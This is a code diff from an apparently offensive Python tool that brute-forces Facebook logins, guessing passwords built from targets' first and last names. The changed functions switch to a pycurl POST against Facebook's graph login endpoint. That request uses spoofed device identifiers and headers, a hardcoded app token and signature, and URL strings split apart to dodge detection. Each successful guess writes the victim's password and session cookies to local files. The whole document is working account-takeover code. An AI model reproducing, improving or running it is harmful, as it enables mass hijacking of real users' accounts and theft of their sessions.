@@ -1415,7 +1415,6 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
     animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
     sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
     sys.stdout.flush()
-    ses = requests.Session()
     try:
         first = names.split(' ')[0]
         try:
@@ -1426,24 +1425,81 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
         ps2 = last.lower()
         for fikr in passlist:
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
+            netheni = str(random.randint(20000, 40000))
+            simheni = str(random.randint(20000, 40000))
+            user_agent = mls5()
             warna = random.choice(my_color)
-            ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-            p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {"Host":"www.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {cid} {rad}: {green}{pas}')
-                #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
-                oks.append(cid)
-                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+            adid = str(uuid.uuid4()).upper()
+            device_id = str(uuid.uuid4()).upper()
+            family_device_id = str(uuid.uuid4()).upper()
+            advertiser_id = str(uuid.uuid4()).upper()
+            secure_family_device_id = str(uuid.uuid4()).upper()
+            data = {
+                "adid": f"{adid}",
+                "device_id": f"{device_id}",
+                "family_device_id": f"{family_device_id}",
+                "secure_family_device_id": f"{secure_family_device_id}",
+                "advertiser_id": f"{advertiser_id}",
+                "format": "json",
+                "cpl": "true",
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "register_api",
+                "email": ids,
+                "password": pas,
+                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
+                "generate_session_cookies": "1",
+                "meta_inf_fbmeta": "NO_FILE",     
+                "currently_logged_in_userid": "0",
+                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+                "client_country_code": "US",
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
+            headers = [
+                "Host: graph.facebook.com",
+                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
+                f"X-FB-Net-HNI: {netheni}",
+                f"X-FB-SIM-HNI: {simheni}",
+                f"User-Agent: {user_agent.encode('utf-8')}",
+                "X-FB-Client-IP: True",
+                "X-FB-Request-Analytics-Tags: graphservice",
+                "X-Tigon-Is-Retry: False",
+                "X-FB-HTTP-Engine: Liger",
+                "X-FB-Connection-Quality: MOBILE.LTE",
+                "X-FB-Server-Cluster: True",
+                "Connection: keep-alive",
+                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
+                "X-FB-Connection-Bandwidth: 80025933",
+                "X-FB-Friendly-Name: ViewerReactionsMutation",
+                "Accept-Encoding: gzip, deflate",
+                "X-FB-Connection-Type: MOBILE.LTE",
+                "Content-Type: application/x-www-form-urlencoded",
+            ]
+            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
+            buffer = BytesIO()
+            c = pycurl.Curl()
+            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
+            c.setopt(c.HTTPHEADER, headers)
+            c.setopt(c.WRITEDATA, buffer)
+            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
+            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
+            c.perform()
+            c.close()
+            po = buffer.getvalue().decode('utf-8')
+            q = json.loads(po)
+            if 'access_token' in q:
+                response_data = json.loads(po)
+                cookies = response_data.get("session_cookies")
+                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                oks.append(ids)
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
-            elif "User must verify their account" in lo:
+            elif "User must verify their account" in po:
                 cps.append(ids)
                 #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
@@ -1455,7 +1511,6 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
         time.sleep(10)
     except Exception as e:
         pass
-
 
 def __MTDSIX__(ids, names, passlist, total_ids):
     global oks,cps,loop
@@ -1475,15 +1530,7 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             warna = random.choice(my_color)
             session = requests.Session()
             free_fb = session.get('https://free.facebook.com').text
-            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
-            "login":"Log In"}
+            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
             headers = {'authority': 'p.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
